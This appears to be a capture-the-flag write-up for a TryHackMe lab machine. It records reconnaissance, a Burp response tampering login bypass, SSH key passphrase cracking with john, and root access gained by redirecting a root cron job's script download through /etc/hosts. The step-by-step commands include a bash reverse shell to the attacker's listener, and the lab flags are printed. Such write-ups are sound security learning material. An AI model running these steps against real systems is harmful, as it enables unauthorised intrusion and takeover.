1. Recon
   - `nmap -sV -sC -vv -A -T5 10.10.117.88`
   - ports discovered: 22 & 80


2. Enumerate the directories with dirbuster
   - `dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://<target-ip>` 


3. failed attempts
   - /admin is SQLi protected
   - basic credentials like admin and guest with passwords admin and 12345 didn't work

4. Discoveries
   - found logic behind the login and ended up trying to bypass it with burp suite

 5. bypass the login logic with burp suite
    - installed foxyproxy extension on the browser and created a simple listener on 127.0.0.1:8080 that burp would use
    - used the Proxy tab in burp to intercept the login request and and configured it to receive the response to the login request
    - altered the login failure to a redirect to the page
      ```sh
      HTTP/1.1 302 FOUND
      Date: Mon, 20 Jul 2020 14:33:13 GMT
      Content-Length: 21
      Content-Type: text/plain; charset=utf-8
      Connection: close
      location: /admin
      ```
    - refreshed the webpage and got into a new page that had a private key in in belonging to "james"
    - possible user "Paradox"

6. Access to james' session with ssh
   - `ssh -i priv-key james@<target-ip>` < passphrase was found
   - used john to crack the passphrase
     - `ssh2john priv-key > priv-key.hash`
     - `john james-priv.hash --wordlist=/usr/share/wordlists/rockyou.txt`
   - passphrase: james13

7. Accessed james' session and found the first flag
   - thm{65c1aaf000506e56996822c6281e6bf7}
  
8. Ran linpeas on the target machine
   - found a cron job running as root
   - found /etc/hosts as rw to anyone

9. Privilege escalation attempt
   - because the machine has a cronjob that runs a script from overpass.thm/downloads/src/buildscript.sh, I need to create the path in my local machine and open an http server and a nc listener so that the target machine can connect to my machine via the cronjob(after changing the overpass.thm's ip in /etc/hosts)
   - changed overpass.thm's ip in /etc/hosts to my local machine ip
   - opened a nc listener on port 9001 `nc -lnvp 9001`
   - created the necessary paths(./downloads/src/buildscript.sh) so that the cron job fetches the script correctly
   - opened an http server on my local machine so that the curl will refer to my local machine `python3 -m http.server 80`
   - added this shell code to buildscript.sh in my local machine inside /download/src/buildscript.sh
     ```sh
     bash -i >& /dev/tcp/<local-machine-ip>/9001 0>&1
     ```

10. Got root after the cronjob ran and found the flag
    - thm{123cewfa00ey0e6yrt56954386321e61wqa}
